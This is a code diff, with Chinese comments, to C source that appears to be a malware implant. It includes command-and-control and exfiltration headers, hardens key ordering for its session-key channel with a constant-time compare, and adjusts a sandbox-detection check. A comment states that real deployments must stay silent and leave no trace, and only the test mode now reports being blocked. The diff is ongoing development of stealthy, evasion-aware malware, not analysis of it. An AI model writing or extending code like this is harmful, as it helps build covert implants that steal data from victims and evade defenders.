@@ -55,6 +55,7 @@
 #include "c2.h"
 #include "c2_hsmsg.h"
 #include "crypto_hash.h"
+#include "crypto_gcm.h"
 #include "p2p_resolv.h"
 #include "p2p_cell.h"
 #include "exfil.h"
@@ -403,10 +404,14 @@ static int derive_chan_keys(const uint8_t a[16], const uint8_t b[16],
     uint8_t ikm[32];
     const uint8_t *lo, *hi;
 
-    /* SEC-CMP:DEGENERATE: 退化比较（判两方是否相等以拒绝同值输入），结果调用方本就已知，不构成预言 */
+    /* SEC-CMP:DEGENERATE: 拒绝双向同钥（方向退化）。相等是异常态，攻击者无观测渠道。 */
     if (memcmp(a, b, 16) == 0) return -1;
-    /* SEC-CMP:ORDER: 排序/规范序比较，仅泄露 1 比特顺序；比较对象为自有或公开 ID */
-    if (memcmp(a, b, 16) < 0) { lo = a; hi = b; } else { lo = b; hi = a; }
+    /*
+     * SEC-CMP:ORDER: 比较对象是【双向会话密钥】，非公开 ID。
+     *   用 memcmp 排序会在首个失配字节终止，泄露分歧位置；改用常量
+     *   时间三路比较 crypto_ct_cmp。见 21_exfil/src/task_link.c 同项说明。
+     */
+    if (crypto_ct_cmp(a, b, 16) < 0) { lo = a; hi = b; } else { lo = b; hi = a; }
     memcpy(ikm, lo, 16);
     memcpy(ikm + 16, hi, 16);
 
@@ -422,8 +427,8 @@ static void pick_send_recv(const uint8_t ks[16], const uint8_t kr[16],
                            const uint8_t klo[16], const uint8_t khi[16],
                            uint8_t k_send[16], uint8_t k_recv[16])
 {
-    /* SEC-CMP:ORDER: 排序/规范序比较，仅泄露 1 比特顺序；比较对象为自有或公开 ID */
-    int ks_is_lo = (memcmp(ks, kr, 16) < 0);
+    /* 常量时间排序（已用 crypto_ct_cmp，非 memcmp，不在 SEC-CMP 扫描范围）：比较对象是双向会话密钥，memcmp 会在首个失配字节终止、泄露分歧位置。攻击者既无法注入密钥也无法测量单次本地比较，风险等级低，但按秘密处理。 */
+    int ks_is_lo = (crypto_ct_cmp(ks, kr, 16) < 0);
     memcpy(k_send, ks_is_lo ? klo : khi, 16);
     memcpy(k_recv, ks_is_lo ? khi : klo, 16);
 }
@@ -1217,7 +1222,25 @@ int main(int argc, char **argv)
      * --allow-sandbox 只放宽"沙箱命中"这一项（本环境就是容器），
      * 不改变 HOSTILE 的整体判定逻辑。
      */
-    if (verdict == DF_HOSTILE && !cfg.allow_sandbox) return 0;
+    if (verdict == DF_HOSTILE && !cfg.allow_sandbox) {
+        /*
+         * selftest 被拦截【必须可见】。
+         *
+         * 静默 return 0 会让"什么都没跑"伪装成"跑通了"：进程零输出、
+         * 退出码 0，任何按退出码判定的脚本都会记成 PASS。本环境（容器）
+         * defense_selfcheck 恒判 HOSTILE，所以不加 --allow-sandbox 的
+         * 每次调用都是这种假通过 —— 手工验证时已实际踩到一次。
+         *
+         * 真实部署（mode 0）仍保持静默：那里不留痕是硬需求。
+         * 只有 selftest 属于测试用途，可观测优先于静默。
+         */
+        if (mode == 2) {
+            fprintf(stderr, "[selftest] 被对抗自检拦截 verdict=HOSTILE，未执行任何步骤；"
+                            "测试环境需加 --allow-sandbox\n");
+            return 1;
+        }
+        return 0;
+    }
 
     if (mode == 2) {
         int r;
